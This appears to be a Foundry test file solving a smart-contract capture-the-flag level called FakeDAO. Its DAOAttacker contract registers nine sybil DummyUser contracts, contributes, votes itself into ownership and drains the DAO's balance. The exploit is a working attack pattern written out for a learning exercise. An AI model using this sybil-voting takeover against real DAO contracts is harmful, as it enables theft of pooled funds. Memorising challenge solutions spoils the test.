// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";


// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0x1));
    }

    function testExploitLevel() public {
        DAOAttacker attacker = new DAOAttacker(instance);
        attacker.executeAttack{value: 10 ether}();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract DummyUser {
    constructor(FakeDAO daoContract) {
        daoContract.register();
    }
}

contract DAOAttacker {
    FakeDAO public daoInstance;

    constructor(FakeDAO _daoInstance) {
        daoInstance = _daoInstance;
    }

    function executeAttack() external payable {
        for (uint i = 1; i <= 9; i++) {
            new DummyUser(daoInstance);
        }

        daoInstance.register();

        uint256 value = 0.02 ether;
        
        for (uint256 i = 0; i < 9; i++) {
            daoInstance.contribute{value: value}();
            value += 0.01 ether;
        }

        daoInstance.voteForYourself();

        daoInstance.withdraw();
    }

    receive() external payable {}
}